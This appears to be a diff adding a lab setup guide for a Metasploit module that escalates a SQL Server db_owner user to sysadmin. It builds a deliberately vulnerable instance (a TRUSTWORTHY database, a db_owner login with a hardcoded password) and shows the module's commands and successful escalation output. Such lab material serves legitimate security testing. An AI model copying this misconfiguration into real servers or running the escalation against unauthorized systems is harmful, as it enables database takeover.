@@ -1,0 +1,80 @@
+SQL Server: Escalating from db_Owner to sysadmin
+Lab setup guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_escalate_dbowner module.
+
+1.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+2.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+3.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+4.	Press the "New Query" button and use the TSQL below to create a database named "MyAppDb" for the lab. 
+
+-- Create database
+CREATE DATABASE MyAppDb
+
+-- Verify sa is the owner of the application database
+SELECT suser_sname(owner_sid) 
+FROM sys.databases 
+WHERE name = 'MyAppDb'
+
+5.	Press the "New Query" button and use the TSQL below to create a database user named "MyAppUser" for the lab.  In the real world some DBAs create an account like this to allow applications to connect to the database server.
+
+-- Create login
+CREATE LOGIN MyAppUser WITH PASSWORD = 'MyPassword!';
+
+6.	Press the "New Query" button and use the TSQL below to assign "MyAppUser" the "db_owner" role in the "MyAppDb" database.  In the real world a DBA might do this so that the application can access what it needs in its application database once logged in.
+
+-- Setup MyAppUsers the db_owner role in MyAppDb
+USE MyAppDb
+ALTER LOGIN [MyAppUser] with default_database = [MyAppDb];
+CREATE USER [MyAppUser] FROM LOGIN [MyAppUser];
+EXEC sp_addrolemember [db_owner], [MyAppUser];
+
+7.	Confirm the "MyAppUser" was added as db_owner.
+
+-- Verify the user was added as db_owner
+select rp.name as database_role, mp.name as database_user
+from sys.database_role_members drm
+join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
+join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+
+8.	Set the "MyAppDb" database as trusted using the TSQL below.  DBAs tend to do this when custom stored procedures access tables from other databases or when the custom stored procedures use native stored procedures that access external resources.
+
+-- Flag database as trusted
+ALTER DATABASE MyAppDb SET TRUSTWORTHY ON
+
+9.	The query below will return all of the databases in the SQL Server instance, and the "MyAppDb" and "MSDB" databases should be flagged as trustworthy.
+
+SELECT a.name,b.is_trustworthy_on 
+FROM master..sysdatabases as a
+INNER JOIN sys.databases as b
+ON a.name=b.name;
+
+10. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+11. Test out the module.
+
+use auxiliary/admin/mssql/mssql_esclaate_dbowner
+set rhosts <target ip>
+set rport <target database port>
+set username MyAppUser
+set password MyPassword!
+run
+
+[*] Attempting to connect to the database server at 192.168.1.5 as MyAppUser...
+[+] Connected.
+[*] Checking if MyAppUser has the sysadmin role...
+[*] You're NOT a sysadmin, let's try to change that.
+[*] Checking for trusted databases owned by sysadmins...
+[+] 1 affected database(s) were found:
+[*]  - MyAppDb
+[*] Checking if the user has the db_owner role in any of them...
+[+] - db_owner on MyAppDb found!
+[*] Attempting to escalate in MyAppDb...
+[+] Congrats, MyAppUser is now a sysadmin!.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
